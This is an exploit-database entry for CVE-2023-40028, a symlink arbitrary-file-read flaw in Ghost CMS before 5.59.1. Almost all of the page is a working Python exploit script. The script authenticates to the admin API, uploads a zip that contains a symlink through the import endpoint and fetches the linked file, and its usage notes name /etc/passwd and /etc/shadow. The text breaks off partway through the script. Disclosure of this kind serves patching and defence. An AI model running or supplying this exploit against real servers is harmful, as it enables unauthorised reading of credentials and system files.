---
title: Ghost CMS 5.59.1 Arbitrary File Read
url: https://cxsecurity.com/issue/WLB-2025080024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-29
fetch_date: 2025-10-07T00:13:32.482765
---

# Ghost CMS 5.59.1 Arbitrary File Read

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ghost CMS 5.59.1 Arbitrary File Read** **2025.08.28**  Credit:  **[ibrahimsql](https://cxsecurity.com/author/ibrahimsql/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-40028](https://cxsecurity.com/cveshow/CVE-2023-40028/ "Click to see CVE-2023-40028")**  CWE: **[CWE-200](https://cxsecurity.com/cwe/CWE-200 "Click to see CWE-200")** | |

#!/usr/bin/env python3
# -\*- coding: utf-8 -\*-
"""
# Exploit Title: Ghost CMS 5.59.1 - Arbitrary File Read
# Date: 2023-09-20
# Exploit Author: ibrahimsql (https://github.com/ibrahmsql)
# Vendor Homepage: https://ghost.org
# Software Link: https://github.com/TryGhost/Ghost
# Version: < 5.59.1
# Tested on: Ubuntu 20.04 LTS, Windows 10, macOS Big Sur
# CVE: CVE-2023-40028
# Category: Web Application Security
# CVSS Score: 6.5 (Medium)
# Description:
# Ghost CMS versions prior to 5.59.1 contain a vulnerability that allows authenticated users
# to upload files that are symlinks. This can be exploited to perform arbitrary file reads
# of any file on the host operating system. The vulnerability exists in the file upload
# mechanism which improperly validates symlink files, allowing attackers to access files
# outside the intended directory structure through symlink traversal.
# Requirements: requests>=2.28.1, zipfile, tempfile
# Usage Examples:
# python3 CVE-2023-40028.py http://localhost:2368 admin@example.com password123
# python3 CVE-2023-40028.py https://ghost.example.com user@domain.com mypassword
# Interactive Usage:
# After running the script, you can use the interactive shell to read files:
# file> /etc/passwd
# file> /etc/shadow
# file> /var/log/ghost/ghost.log
# file> exit
"""
import requests
import sys
import os
import tempfile
import zipfile
import random
import string
from typing import Optional
class ExploitResult:
def \_\_init\_\_(self):
self.success = False
self.file\_content = ""
self.status\_code = 0
self.description = "Ghost CMS < 5.59.1 allows authenticated users to upload symlink files for arbitrary file read"
self.severity = "Medium"
class GhostArbitraryFileRead:
def \_\_init\_\_(self, ghost\_url: str, username: str, password: str, verbose: bool = True):
self.ghost\_url = ghost\_url.rstrip('/')
self.username = username
self.password = password
self.verbose = verbose
self.session = requests.Session()
self.session.headers.update({
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
'Accept': 'application/json, text/plain, \*/\*',
'Accept-Language': 'en-US,en;q=0.9'
})
self.api\_url = f"{self.ghost\_url}/ghost/api/v3/admin"
def authenticate(self) -> bool:
"""Authenticate with Ghost CMS admin panel"""
login\_data = {
'username': self.username,
'password': self.password
}
headers = {
'Origin': self.ghost\_url,
'Accept-Version': 'v3.0',
'Content-Type': 'application/json'
}
try:
response = self.session.post(
f"{self.api\_url}/session/",
json=login\_data,
headers=headers,
timeout=10
)
if response.status\_code == 201:
if self.verbose:
print("[+] Successfully authenticated with Ghost CMS")
return True
else:
if self.verbose:
print(f"[-] Authentication failed: {response.status\_code}")
return False
except requests.RequestException as e:
if self.verbose:
print(f"[-] Authentication error: {e}")
return False
def generate\_random\_name(self, length: int = 13) -> str:
"""Generate random string for image name"""
return ''.join(random.choices(string.ascii\_letters + string.digits, k=length))
def create\_exploit\_zip(self, target\_file: str) -> Optional[str]:
"""Create exploit zip file with symlink"""
try:
# Create temporary directory
temp\_dir = tempfile.mkdtemp()
exploit\_dir = os.path.join(temp\_dir, 'exploit')
images\_dir = os.path.join(exploit\_dir, 'content', 'images', '2024')
os.makedirs(images\_dir, exist\_ok=True)
# Generate random image name
image\_name = f"{self.generate\_random\_name()}.png"
symlink\_path = os.path.join(images\_dir, image\_name)
# Create symlink to target file
os.symlink(target\_file, symlink\_path)
# Create zip file
zip\_path = os.path.join(temp\_dir, 'exploit.zip')
with zipfile.ZipFile(zip\_path, 'w', zipfile.ZIP\_DEFLATED) as zipf:
for root, dirs, files in os.walk(exploit\_dir):
for file in files:
file\_path = os.path.join(root, file)
arcname = os.path.relpath(file\_path, temp\_dir)
zipf.write(file\_path, arcname)
return zip\_path, image\_name
except Exception as e:
if self.verbose:
print(f"[-] Error creating exploit zip: {e}")
return None, None
def upload\_exploit(self, zip\_path: str) -> bool:
"""Upload exploit zip file to Ghost CMS"""
try:
headers = {
'X-Ghost-Version': '5.58',
'X-Requested-With': 'XMLHttpRequest',
'Origin': self.ghost\_url,
'Referer': f"{self.ghost\_url}/ghost/"
}
with open(zip\_path, 'rb') as f:
files = {
'importfile': ('exploit.zip', f, 'application/zip')
}
response = self.session.post(
f"{self.api\_url}/db",
files=files,
headers=headers,
timeout=30
)
if response.status\_code in [200, 201]:
if self.verbose:
print("[+] Exploit zip uploaded successfully")
return True
else:
if self.verbose:
print(f"[-] Upload failed: {response.status\_code}")
return False
except requests.RequestException as e:
if self.verbose:
print(f"[-] Upload error: {e}")
return False
def read\_file(self, target\_file: str) -> ExploitResult:
"""Read arbitrary file using symlink upload"""
result = ExploitResult()
if not self.authenticate():
return result
if self.verbose:
print(f"[\*] Attempting to read file: {target\_file}")
# Create exploit zip
zip\_path, image\_name = self.create\_exploit\_zip(target\_file)
if not zip\_path:
return result
try:
# Upload exploit
if self.upload\_exploit(zip\_path):
# Try to access the symlinked file
file\_url = f"{self.ghost\_url}/content/images/2024/{image\_name}"
response = self.session.get(file\_url, timeout=10)
if response.status\_code == 200 and len(response.text) > 0:
result.success = True
result.file\_content = response.text
result.status\_code = response.status\_code
if self.verbose:
print(f"[+] Successfully read file: {target\_file}")
print(f"[+] File content length: {len(response.text)} bytes")
else:
if self.verbose:
print(f"[-] Fail...